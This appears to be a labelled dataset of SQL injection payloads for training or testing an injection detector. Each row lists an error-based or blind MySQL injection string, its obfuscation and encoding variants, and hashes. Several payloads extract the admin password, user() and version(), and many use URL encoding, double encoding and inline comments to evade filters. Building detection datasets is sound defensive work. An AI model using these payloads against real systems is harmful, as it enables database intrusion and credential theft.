id%253D1%2527%2BaNd%2Bcase%2Bwhen%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2BThen%2B1%252F0%2Belse%2B1%2Bend%2B%252F%252A,1,sqli_error,case_var|comment_block_comment,double_encoded,SQLI_ERROR_004,dc0aab27e25f44593ec8a700ae58e0af,8619d116e142d869df8ae968e9604c34,126
id=1'%20And%20EXP(~(SELECT%20*%20FROM%20(SELECT%20seleCT%20user())a))%20/*,1,sqli_error,case_var|comment_block_comment|ws_url_space,raw,SQLI_ERROR_005,0502b6281dc15b9bb7eb659cfedc1a8f,a6b3b083814da04faefd456671f1b6ea,74
id=1' AND EXP(~(SELECT * FROM (SELECT SELECT password FROM users WHERE user='admin')a)) ;-- -,1,sqli_error,comment_semicolon_comment,raw,SQLI_ERROR_005,51594d5e80eeaeefb7ddecb931261ac1,db3fbd2a361e0b4ce63b85b63e1eda47,93
id%253D1%2527%2509And%2509cASE%2509When%2509%2528100%253C200%2529%2509then%25091%252F0%2509ELSE%25091%2509enD%2509--%2509-,1,sqli_error,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_ERROR_004,af7ab54dfd31b7b71d3aee81ef1963f7,f6bdae889680f8c6964fec924a386189,122
id=1'+and+case+when+(7=7)+THEN+1/0+ELse+1+END+--,1,sqli_error,case_var|comment_dash_dash|ws_plus,raw,SQLI_ERROR_004,38ef16304a7a2a316465a3f45eb01e55,0386ddb415266d7118cdf0ad47ead9a8,48
id%253D1%2527%2BAnd%2BCase%2BWhen%2B%25281%253D1%2529%2Bthen%2B1%252F0%2BElse%2B1%2BEND%2B%252F%252A,1,sqli_error,case_var|comment_block_comment,double_encoded,SQLI_ERROR_004,39342efce7404d05632912d086f300b4,ff30aa516437271df1a3c448fece418b,100
"id%3D1%27+and+(SELECT 1+FROM+(SELECT COUNT(%2A),CONCAT((SELECT+version()),FLOOR(RAND(0)*2))x From+information_schema.tables+GROUP BY+x)a)+%23",1,sqli_error,case_var|comment_url_hash,partially_encoded,SQLI_ERROR_001,74273ff9663459cb5a00fa985505a27a,8fcd788075f36da4f98cc98ddf58aa57,141
id=1%27+AnD+EXP(~(SELECT+*+from+(SELECT select+version())a)) /%2A,1,sqli_error,case_var|comment_block_comment,partially_encoded,SQLI_ERROR_005,b37f29e4d136d447419032099b278e7e,6204ea9cde7b87c43a84f8169ba5f01d,65
id%3D1%27+anD+CASE+WHEN+%287%3D7%29+Then+1%2F0+ELSE+1+End+%2523,1,sqli_error,case_var|comment_url_hash,url_encoded,SQLI_ERROR_004,7542266332f4d1d1e77ba1c53ea3f9e8,291336017161d54def2ddd4cdd3bf382,63
id%253D1%2527%2B%2BAND%2B%2BEXP%2528~%2528SELECT%2B%2B%252A%2B%2BFrom%2B%2B%2528SELECT%2B%2BSELect%2B%2Buser%2528%2529%2529a%2529%2529%2B%2B%252F%252A,1,sqli_error,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_ERROR_005,4fa105a35f808cecaad35abbcea255b9,539969e0ee6f3abb9aa57ab134c1ae12,150
"id%3D1'+ ANd++UPDATEXML(1, +CONCAT(0x7e,+ (SELECT++version())), +1)+ --",1,sqli_error,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_ERROR_003,68337666355fc23bbe89e9b6ca581040,b0a406b281507902af50ef07b18da2f1,71
"id%3D1%27%2F%2A*/AND/%2A*%2FUPDATEXML(1,/**/CONCAT(0x7e,%2F%2A*%2F(SELECT/%2A%2A%2Fversion())),%2F%2A%2A%2F1)/%2A%2A%2F--",1,sqli_error,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_ERROR_003,ae5e4d01ea539ac44a8b3409b2fa245b,6499d8a4961b0c87718393c3740a72b1,121
id%3D1%27+and+EXP(~(SELECT+%2A+fRoM+(SELECT+SELECT+database())a))+#,1,sqli_error,case_var|comment_hash|ws_mixed_ws,partially_encoded,SQLI_ERROR_005,aba694b6831ff6427c824c2a6388740e,634f48a2aae9e2ad2c37e515843fa45b,67
id%3D1%27+++AND+++EXP%28~%28SELECT+++%2A+++FROM+++%28SELECT+++SELECT+++database%28%29%29a%29%29+++--+++-,1,sqli_error,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_ERROR_005,4344dd2556042a2a118be1c1a893659d,bff36cce820c09da1480a0307480de1d,104
id%253D1%2527%2509And%2509EXP%2528~%2528SELECT%2509%252A%2509From%2509%2528SELECT%2509select%2509database%2528%2529%2529a%2529%2529%2509--%2509-,1,sqli_error,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_ERROR_005,76f669b00f056cdba7cb0854e58ba319,d4cbfede1612cdde613ccfc9ef34c8be,144
id%253D1%2527%2BaND%2BUPDATEXML%25281%252C%2BCONCAT%25280x7e%252C%2B%2528SELECT%2Buser%2528%2529%2529%2529%252C%2B1%2529%2B%252F%252A,1,sqli_error,case_var|comment_block_comment|ws_space,double_encoded,SQLI_ERROR_003,b3668ff5f8c7b83e1a274b584d2e1bf0,304f64f31b37c73752bc8393b29431f1,133
id%3D1%27 And+CASE+when (%27a%27%3D%27a%27)+THEN+1/0+Else 1+END+#,1,sqli_error,case_var|comment_hash,partially_encoded,SQLI_ERROR_004,10e48e2db673f695103a356b76fb7f29,33a47cd89296c1a87ad3af5372c1c967,65
id%253D1%2527%2BAND%2BCAsE%2BwhEN%2B%25282%253E1%2529%2Bthen%2B1%252F0%2Belse%2B1%2BeND%2B%252523,1,sqli_error,case_var|comment_url_hash,double_encoded,SQLI_ERROR_004,321c0ec2a1f8dd10871e6b92a93fb44b,fad7fa2eba07a9923609c940cfd9c88e,97
id%3D1'%20aNd%20EXP(~(SELECT%20*%20FroM%20(SELECT%20Select%20database())a))%20%23,1,sqli_error,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_ERROR_005,f4860d6ae455a37781f1a5c37c284d9c,56f827af683e984b78442f347f63699b,81
id%3D1%27%2Band%2BEXTRACTVALUE%281%2C%2BCONCAT%280x7e%2C%2B%28SELECT%2Bpassword%2Bfrom%2Busers%2BWhere%2Buser%3D%27admin%27%29%29%29%2B%23,1,sqli_error,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_ERROR_002,811ed248ab3215edfd6b0546a3f247f8,c9fe335e98b4181e77fe02e4b5180946,138
id%3D1%27%2Band%2B%28SELECT%2B1%2BFROM%2B%28SELECT%2BCOUNT%28%2A%29%2CCONCAT%28%28SELECT%2Buser%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x%2Bfrom%2Binformation_schema.tables%2BGROUP%2BBY%2Bx%29a%29%2B%2523,1,sqli_error,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_ERROR_001,fc967cc33d7b16d2259b0f821e042621,20a41998477c8d91d10722019e88cf42,204
id%3D1%27+AND+EXP(~(SELECT %2A+FROM+(SELECT+SELECT+version())a))+--,1,sqli_error,comment_dash_dash,partially_encoded,SQLI_ERROR_005,f9cfac1202b2b683a43a9206aa25b571,cfc7dd822b47daec6d2bafb3c0b070e6,67
id%3D1%27%09AND%09CASE%09WHEN%09%281%3D1%29%09THEN%091%2F0%09ELSE%091%09END%09--%09-,1,sqli_error,comment_dash_dash_space|ws_tab,url_encoded,SQLI_ERROR_004,71b595d30280b4a80ff1d690df68db1b,96f244acd2c83ce9f69cd35292c81a53,84
id=1'+AND+CASE+when+(100<200)+THeN+1/0+Else+1+END+/*,1,sqli_error,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_ERROR_004,71b87d77ffe380c2ad799b6e587b3ff6,2d56d5bd1f64ce93425d079b7bc73a18,52
id%3D1%27+++ANd+++EXP%28~%28SELECT+++%2A+++from+++%28SELECT+++select+++password+++From+++users+++Where+++user%3D%27admin%27%29a%29%29+++%2523,1,sqli_error,case_var|comment_url_hash|ws_mixed_ws,url_encoded,SQLI_ERROR_005,4bf6e00da3e7dd33772c6cfeba6a4fd1,68c9fc487e33bcb487cbfd61f0df42c0,141
"id=1'	AND	(SELECT	1	from	(SELECT	COUNT(*),CONCAT((SELECT	version()),FLOOR(RAND(0)*2))x	FROM	information_schema.tables	GROUP	BY	x)a)	/*",1,sqli_error,case_var|comment_block_comment|ws_tab,raw,SQLI_ERROR_001,de5c63294892a9a79a34ff71b9810b6a,0e060001443d1bac592567c82c136776,134
"id=1'%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20user())))%20/*",1,sqli_error,comment_block_comment|ws_url_space,raw,SQLI_ERROR_002,3e6dd5b125d6a01f0702dd115ae5810c,fc3801bf8621ce26dc2ea2ea2e903aec,71
id%3D1%27%2BAND%2B%28SELECT%2B1%2Bfrom%2B%28SELECT%2BCOUNT%28%2A%29%2CCONCAT%28%28SELECT%2Buser%28%29%29%2CFLOOR%28RAND%280%29%2A2%29%29x%2Bfrom%2Binformation_schema.tables%2BGROUP%2BBY%2Bx%29a%29%2B%2F%2A,1,sqli_error,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_ERROR_001,c4912e8ea87431e9949d50bdf5bdb618,7cf750b001fbb27fcf067fac5880a102,205
id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252FUPDATEXML%25281%252C%252F%252A%252A%252FCONCAT%25280x7e%252C%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252Fpassword%252F%252A%252A%252FFrom%252F%252A%252A%252Fusers%252F%252A%252A%252FWhere%252F%252A%252A%252Fuser%253D%2527admin%2527%2529%2529%252C%252F%252A%252A%252F1%2529%252F%252A%252A%252F%2523,1,sqli_error,case_var|comment_hash|ws_comment_ws,double_encoded,SQLI_ERROR_003,4a64cdfecbb764f59621c0c4ebc52874,a66b1dd8d7294e069bad4f4ccd967ca2,359
id=1'	AND	EXP(~(SELECT	*	FROM	(SELECT	SELECT	version())a))	--,1,sqli_error,comment_dash_dash|ws_tab,raw,SQLI_ERROR_005,7d557e6a20cb4d0f4317b2886777ad39,11da73cc0415325b9aa93ab717d74f13,61
id%3D1%27+AND+CASE+WHEN+%28100%3C200%29+THEN+1%2F0+ELSE+1+END+%2F%2A,1,sqli_error,comment_block_comment,url_encoded,SQLI_ERROR_004,f734b18a8f69c728c147bfc75a85262f,50fe876532d5ad13fb802e72f62eda50,68
"id%3D1'	AND	UPDATEXML(1,	CONCAT(0x7e,	(SELECT	database())),	1)	/*",1,sqli_error,comment_block_comment|ws_tab,partially_encoded,SQLI_ERROR_003,7b48cd085b81779574047601199086f3,9519d86b7d90bae5c57580015ee85253,65
"id%3D1%27  and +(SELECT++1++From +(SELECT  COUNT(*),CONCAT((SELECT +password +From  users++WHERE  user%3D%27admin%27),FLOOR(RAND(0)%2A2))x +From+ information_schema.tables +GROUP++BY++x)a)+ #",1,sqli_error,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_ERROR_001,e760a6a25568b70297771cdfe60e74ee,40cc1f76857b9c443a328aca65dd4ae2,191
"id=1'%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20version())))%20/%2A",1,sqli_error,comment_block_comment|ws_url_space,partially_encoded,SQLI_ERROR_002,e01286b628b3a086e00dd66f323351a4,a59d59aa070cf544c99c61593f7aefc6,76
id%3D1%27%2520And%2520EXTRACTVALUE%281%2C%2520CONCAT%280x7e%2C%2520%28SELECT%2520database%28%29%29%29%29%2520--%2520-,1,sqli_error,case_var|comment_dash_dash_space|ws_url_space,url_encoded,SQLI_ERROR_002,8253ee7761adac217a3e58da20fe76c2,20be36765b71dc1ae7fac1f68ad0b2e8,117
id=1%27/**%2FAnd/**%2FCASE%2F%2A%2A/when/%2A%2A%2F(%27a'='a%27)%2F**/Then%2F%2A%2A/1/0%2F%2A*/Else/**%2F1/**/End%2F%2A*/--,1,sqli_error,case_var|comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_ERROR_004,a49c27802eda99f8dabdfd4370c18b71,f95b6825a83e4de2d095abfa36786341,122
"id=1%27+AND (SELECT+1+FrOm+(SELECT+COUNT(*),CONCAT((SELECT+user()),FLOOR(RAND(0)%2A2))x+From+information_schema.tables+GROUP+BY x)a) --",1,sqli_error,case_var|comment_dash_dash,partially_encoded,SQLI_ERROR_001,778478d9cd3abbd5b081a2986dc370d0,4363a523cfb035b71fde09ac5757247c,135
"id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users where user='admin'))) #",1,sqli_error,case_var|comment_hash,raw,SQLI_ERROR_002,957adfdb1ae8a498012cd6c7dcf2892e,ba3fb0f147039dce98f5658556ce3993,90
id%3D1%27+And case+when (2%3E1) then+1/0+Else+1 End --,1,sqli_error,case_var|comment_dash_dash|ws_space,partially_encoded,SQLI_ERROR_004,3317b4296928f0a6e476e28f8c0606c7,9f44c98e03d75fc8fab0dbe475aa3862,54
"id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) #",1,sqli_error,comment_hash,raw,SQLI_ERROR_001,e8c11b36f8f2cc111513f3603817fc03,41a278e8b4226bc69d9b83ff05ea9fba,134
id%3D1%27%2F%2A%2A%2FANd%2F%2A%2A%2Fcase%2F%2A%2A%2Fwhen%2F%2A%2A%2F%28ASCII%28%27A%27%29%3D65%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F0%2F%2A%2A%2FElse%2F%2A%2A%2F1%2F%2A%2A%2FeNd%2F%2A%2A%2F%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,cbe8e161ff927568bb9b0a74728eb770,07d4ab00df2153ea16dc27315dc18231,192
id=1'/**/And/**/(SELECT/**/1/0/**/From/**/dual/**/WHerE/**/CHAR(97)='a')/**/--,1,sqli_blind_error,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_BLIND_ERROR_002,925461188cd1d3f0074d78b64ff5ca8a,f4bb9f943f10e8c981d21450a1d953c1,78
id=1'+and+(SELECT+1/0+FROM+dual+Where+7=7)+%23,1,sqli_blind_error,case_var|comment_url_hash|ws_plus,raw,SQLI_BLIND_ERROR_002,f8acf1d0b31ff7ae3ac107437c7abb5f,8b564a2eb404f472c1b4661fb5018f36,46
id=1' And (SELECT 1/0 FROM dual wHere 7=7) --,1,sqli_blind_error,case_var|comment_dash_dash,raw,SQLI_BLIND_ERROR_002,93dc57da9f11189049f5970abfa05b43,57502185530facb8803c0eb4a08f19c5,45
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520WHERE%2520LENGTH%28%27test%27%29%3D4%29%2520%2523,1,sqli_blind_error,comment_url_hash|ws_url_space,url_encoded,SQLI_BLIND_ERROR_002,611090c12376b12605fd81ae98144f5b,076fc0a487e8b910ad2f44aac84dbee1,113
id=1'%2F**%2Fand%2F%2A%2A/(SELECT%2F%2A%2A/1%2F0%2F**%2FFrOM/%2A%2A/dual/%2A*%2FWhere/%2A*/1=1)%2F**/%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_002,c6b9522ebb4950702d3d59a434ecce85,9a1d5833f2e903197d837f173b79ab35,107
id%3D1%27+And+CASE+wheN+%282%3E1%29+THEN+1%2F0+else+1+end+--,1,sqli_blind_error,case_var|comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_001,22082c1e2256e159be48094e2d6293a9,f77a38426172f50c004d97fc332bb891,60
id%253D1%2527%252F%252A%252A%252Fand%252F%252A%252A%252FCAsE%252F%252A%252A%252FWhen%252F%252A%252A%252F%25287%253D7%2529%252F%252A%252A%252FTHEN%252F%252A%252A%252F1%252F0%252F%252A%252A%252FeLsE%252F%252A%252A%252F1%252F%252A%252A%252FEND%252F%252A%252A%252F%252523,1,sqli_blind_error,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_BLIND_ERROR_001,6a7d7f242543c82e044a89522d98688f,772d35e566ccff788f45c93d24b4adee,267
id%253D1%2527%2B%2BAND%2B%2BCase%2B%2BWhen%2B%2B%2528%2527a%2527%253D%2527a%2527%2529%2B%2Bthen%2B%2B1%252F0%2B%2Belse%2B%2B1%2B%2BEnd%2B%2B--%2B%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_BLIND_ERROR_001,121bf8432601c86f2c42df8d2fac5911,c5c009432b1101197be3bb0cec5d808b,149
id%3D1%27%20aND%20(SELECT%201/0%20From%20dual%20where%201=1)%20--,1,sqli_blind_error,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_BLIND_ERROR_002,cacf2718ecbdc21390078abb32b2c5df,03178c9d90a154f765a9e4ee76e340a2,65
id%3D1%27%2BAND%2BCASE%2BWHEN%2B%282%3E1%29%2BTHEN%2B1%2F0%2BELSE%2B1%2BEND%2B--%2B-,1,sqli_blind_error,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_BLIND_ERROR_001,c53519d6598182b1ad1bdfb121b6cf12,a77983483b4e5fd140d88d10f245f53b,84
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520WHERE%2520CHAR%2897%29%3D%27a%27%29%2520%23,1,sqli_blind_error,comment_hash|ws_mixed_ws,url_encoded,SQLI_BLIND_ERROR_002,f20fb8dc1a3de421a04a030cd21e2a34,8458b9ec4d17ca3342081894f2889dce,107
id=1'%20and%20(SELECT%201/0%20From%20dual%20WHERE%20100<200)%20%23,1,sqli_blind_error,case_var|comment_url_hash|ws_url_space,raw,SQLI_BLIND_ERROR_002,f1c8028f899fb94014351c8359819227,339145cf158c0cd6af233a31e3a0de78,66
id%253D1%2527%252BAND%252BIF%2528%25281%253D1%2529%252C%252B%2528SELECT%252Btable_name%252BFROM%252Binformation_schema.tables%2529%252C%252B0%2529%252B%252523,1,sqli_blind_error,comment_url_hash|ws_plus,double_encoded,SQLI_BLIND_ERROR_003,77f83e72846557547a91a58abe5dc7ef,0498127e349fbf163ef2b7ec946da32f,158
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FCASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28%27a%27%3D%27a%27%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F0%2F%2A%2A%2FElse%2F%2A%2A%2F1%2F%2A%2A%2FEnd%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,4bd2f89e33e770f62bba1582f71c0482,77870ae1690d3811f6c95c6433ea2840,195
"id=1'+ANd+IF((CHAR(97)='a'),+(SELECT+table_name+from+information_schema.tables),+0)+/*",1,sqli_blind_error,case_var|comment_block_comment|ws_plus,raw,SQLI_BLIND_ERROR_003,a7dac9d444327d735cc482275163329b,dc596f3e8d220bbfe6e255377cac07db,86
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252FIF%2528%2528CHAR%252897%2529%253D%2527a%2527%2529%252C%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.tables%2529%252C%252F%252A%252A%252F0%2529%252F%252A%252A%252F%252523,1,sqli_blind_error,comment_url_hash|ws_comment_ws,double_encoded,SQLI_BLIND_ERROR_003,26a5b385ddabcf620d7dd17700d02c64,25c3215a00e72683af8bee6a6a8ac34a,303
id=1'/**/anD/**/cASe/**/when/**/('a'='a')/**/tHEN/**/1/0/**/else/**/1/**/END/**/--/**/-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BLIND_ERROR_001,aeb223b5f6d32e2a18735d928ef7ef3a,6b07ad71e391e66f8cb5d4e9569edbaf,87
"id=1' AND IF((7=7), (SELECT table_name from information_schema.tables), 0) %23",1,sqli_blind_error,case_var|comment_url_hash,raw,SQLI_BLIND_ERROR_003,9b44e2ecc09cf862081ad338d57b0474,ee0b44279203e659c43984ae348ff090,78
id%253D1%2527%2509AND%2509IF%2528%25282%253E1%2529%252C%2509%2528SELECT%2509table_name%2509From%2509information_schema.tables%2529%252C%25090%2529%2509%2523,1,sqli_blind_error,case_var|comment_hash|ws_tab,double_encoded,SQLI_BLIND_ERROR_003,f59a0dae7ae862634c09f0659b00f483,10d1bbf08c97c83c3986fa427905d574,156
id=1' And (SELECT 1/0 FROM dual Where ASCII('A')=65) -- -,1,sqli_blind_error,case_var|comment_dash_dash_space,raw,SQLI_BLIND_ERROR_002,94d512f8840544df31b2025707c8b166,7606d77cfd615ca90cc7e1bf335a8ce7,57
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520from%2520dual%2520wHERE%2520%27a%27%3D%27a%27%29%2520--,1,sqli_blind_error,case_var|comment_dash_dash|ws_url_space,url_encoded,SQLI_BLIND_ERROR_002,121d59ef5cbab206ae501f10291acf0b,6adff044c8f2b975d00d4674b809c815,101
id=1%27 AND CASE+WHEN+(ASCII(%27A%27)%3D65) THEN+1/0+ELSE+1 END+--,1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_001,f99413fa9216e8d6468aa197e61cb73e,c579d1faa110ae6deae630db263c0f11,66
id=1%27	AND	(SELECT	1/0	FROM	dual	where	LENGTH(%27test%27)=4)	%23,1,sqli_blind_error,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_BLIND_ERROR_002,c64549056f09ace2fce3cc139a5acd5f,ba85f2802a244ce6949c76c8e01d48ee,65
id%3D1%27+AND+CASE+WHEN+%28100%3C200%29+THEN+1%2F0+ELSE+1+END+--+-,1,sqli_blind_error,comment_dash_dash_space|ws_space,url_encoded,SQLI_BLIND_ERROR_001,c49256880fa9a741e13b1a5c6d9ff6e9,9f76edab94f099ba31de86523b500c54,66
id=1'%20AND%20(SELECT%201/0%20frOm%20dual%20WHere%20ASCII('A')=65)%20--,1,sqli_blind_error,case_var|comment_dash_dash|ws_mixed_ws,raw,SQLI_BLIND_ERROR_002,9913e987db88f2277de53d6f0c6aa122,3ef3b3d1877f3377d384b27ecdb31baa,71
"id%3D1'%2F%2A%2A/and/**%2FIF((100<200),/**/(SELECT%2F%2A%2A%2Ftable_name/%2A%2A%2FFROm%2F*%2A%2Finformation_schema.tables),%2F%2A*/0)%2F%2A%2A/%3B--/*%2A%2F-",1,sqli_blind_error,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_003,588bb8655aa5f8fb532cb6bef6f4247b,9802cb489f09d6d0908dde905d37364b,157
id%253D1%2527%2B%2B%2BAnd%2B%2B%2BCAse%2B%2B%2BWhen%2B%2B%2B%2528%2527a%2527%253D%2527a%2527%2529%2B%2B%2BTHEN%2B%2B%2B1%252F0%2B%2B%2BElsE%2B%2B%2B1%2B%2B%2Bend%2B%2B%2B--,1,sqli_blind_error,case_var|comment_dash_dash|ws_mixed_ws,double_encoded,SQLI_BLIND_ERROR_001,f2b0c40b461e99e38c1a4debdc2868b5,5a31596dda6a8da6d4a270d4912405b7,172
id=1%27+AND+(SELECT 1/0 From+dual wHERE CHAR(97)='a%27)+/%2A,1,sqli_blind_error,case_var|comment_block_comment,partially_encoded,SQLI_BLIND_ERROR_002,685d8266d0c6edc3fd5e77714a1846f7,97d58c19a90d2946cd656fe01a6080d0,60
id%3D1%27%2520and%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520Where%2520%27a%27%3D%27a%27%29%2520%23,1,sqli_blind_error,case_var|comment_hash|ws_url_space,url_encoded,SQLI_BLIND_ERROR_002,091b4408d8ae03a8680eaa18ac20762a,80dda6068f4fb197cd939fc4c5246c4a,102
id%3D1%27+AND+Case+wHeN+%28ASCII%28%27A%27%29%3D65%29+then+1%2F0+else+1+END+%23,1,sqli_blind_error,case_var|comment_hash,url_encoded,SQLI_BLIND_ERROR_001,b57d4a8f2f76ef8a9aaaf1130f6d651c,581c102c3932a88f1228ffc176117d16,79
id%3D1%27+and+IF%28%281%3D1%29%2C+%28SELECT+table_name+From+information_schema.tables%29%2C+0%29+%23,1,sqli_blind_error,case_var|comment_hash,url_encoded,SQLI_BLIND_ERROR_003,f69d151edd60f51e7d58c7aa6172cc9b,6f267d1acb35112357fac4bb2ae65920,100
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F1%252F0%252F%252A%252A%252FFROM%252F%252A%252A%252Fdual%252F%252A%252A%252FWHERE%252F%252A%252A%252FCHAR%252897%2529%253D%2527a%2527%2529%252F%252A%252A%252F--%252F%252A%252A%252F-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_comment_ws,double_encoded,SQLI_BLIND_ERROR_002,4cbabf8e1bc5aed06b840d4de1d80679,84094b10b326071ccaef9dc1fe6d5c56,267
id%3D1%27+AND+%28SELECT+1%2F0+From+dual+where+2%3E1%29+--+-,1,sqli_blind_error,case_var|comment_dash_dash_space,url_encoded,SQLI_BLIND_ERROR_002,b696896694dffacbc8c9facfc3440439,11e1af8575df22dcc70aba92bcf5b168,59
id=1'%20AND%20(SELECT%201/0%20from%20dual%20WHERE%202>1)%20--,1,sqli_blind_error,case_var|comment_dash_dash|ws_url_space,raw,SQLI_BLIND_ERROR_002,7e8a4c1fb61dacd416a0f690281727e5,030a3b70e71dbec07d814d87e57bc3a7,61
"id=1'/**/And/**/IF((2>1),/**/(SELECT/**/table_name/**/FROM/**/information_schema.tables),/**/0)/**/#",1,sqli_blind_error,case_var|comment_hash|ws_comment_ws,raw,SQLI_BLIND_ERROR_003,5f2744d53a77c1f5c043c54686bac1e5,95b28db61d0f894c253dd2370fb39abf,100
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2FCASE%2F%2A%2A%2Fwhen%2F%2A%2A%2F%28CHAR%2897%29%3D%27a%27%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F0%2F%2A%2A%2Felse%2F%2A%2A%2F1%2F%2A%2A%2FENd%2F%2A%2A%2F--,1,sqli_blind_error,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,3de375f9904ed3150fc71c820ba64fdd,995ad4868c51d93343229869e1ab6f83,187
id%253D1%2527%2BAND%2BIF%2528%25287%253D7%2529%252C%2B%2528SELECT%2Btable_name%2BFROM%2Binformation_schema.tables%2529%252C%2B0%2529%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment,double_encoded,SQLI_BLIND_ERROR_003,f652cc8eb9b19d50a4293418a97746d3,4ff039bf62d837a29309be47257b780c,145
id=1' AND (SELECT 1/0 FROM dual WHERE CHAR(97)='a') -- -,1,sqli_blind_error,comment_dash_dash_space,raw,SQLI_BLIND_ERROR_002,09005e414d7be8c9adc47cffa61457c9,62ed6bc6e36cc97dfba4af34226253c4,56
"id=1'+and+IF((2>1),+(SELECT+table_name+from+information_schema.tables),+0)+;--+-",1,sqli_blind_error,case_var|comment_semicolon_comment|ws_plus,raw,SQLI_BLIND_ERROR_003,fc91456d49bc078ab61247c5b23b6afb,aacedd2fcd7fe5e979b71d3195a1930f,80
id=1' and case WHEN (7=7) thEn 1/0 Else 1 end -- -,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BLIND_ERROR_001,e6221c7fed6cc276079a883b13f91276,317c2eb0851cd2e84be8f6a3807a685c,50
id%3D1%27%09anD%09%28SELECT%091%2F0%09FROM%09dual%09Where%09100%3C200%29%09%23,1,sqli_blind_error,case_var|comment_hash|ws_tab,url_encoded,SQLI_BLIND_ERROR_002,14efeafcaae8105f16e945816317ee19,8d49c512e99e92494c84b36952ebace8,78
id%253D1%2527%252Band%252BIF%2528%25287%253D7%2529%252C%252B%2528SELECT%252Btable_name%252BFROM%252Binformation_schema.tables%2529%252C%252B0%2529%252B%252523,1,sqli_blind_error,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_BLIND_ERROR_003,271b39ce9eddfda1af27b7419f9d7442,bbfee3f9928fa5601db2692b46ad3879,158
id=1'%2F*%2A%2Fand/%2A*/(SELECT/%2A*/1%2F0%2F*%2A/From%2F%2A%2A/dual/%2A%2A/whErE%2F%2A%2A/%27a'%3D'a')%2F%2A%2A%2F--%2F*%2A/-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_002,d9e81d1e6e5f93839f11c2e82faf830b,b128778340dbc5b6416fe6f954eab3f3,126
"id=1' and IF((2>1), (SELECT table_name FROM information_schema.tables), 0) --",1,sqli_blind_error,case_var|comment_dash_dash|ws_space,raw,SQLI_BLIND_ERROR_003,8cf81c560435744989c30f027fb79808,ba70a80dfcf49a231b1a8ea3bde85775,77
id%3D1'+AND+(SELECT+1%2F0 FROM dual+WHERE+LENGTH('test%27)=4)+--,1,sqli_blind_error,comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_002,830b27a25509343f12e891a53fdad8a0,80862b1fdd4b201e42238a2daa27a5ff,64
id=1%27  AND++(SELECT++1%2F0++FROM++dual++WHERE +%27a%27=%27a%27) +--,1,sqli_blind_error,comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BLIND_ERROR_002,c82cb27359cff17d8ae0967355a57959,98c9df6b415f075afb21e8140e8c5bde,69
"id=1%27+++AND + IF((LENGTH(%27test')=4), ++(SELECT ++table_name ++FROM+ +information_schema.tables),   0)  +%23",1,sqli_blind_error,case_var|comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_BLIND_ERROR_003,4d4ca6ca2b693ef277503ba74f8e1e45,bbe62b96625a334d07066b676c5bcd70,111
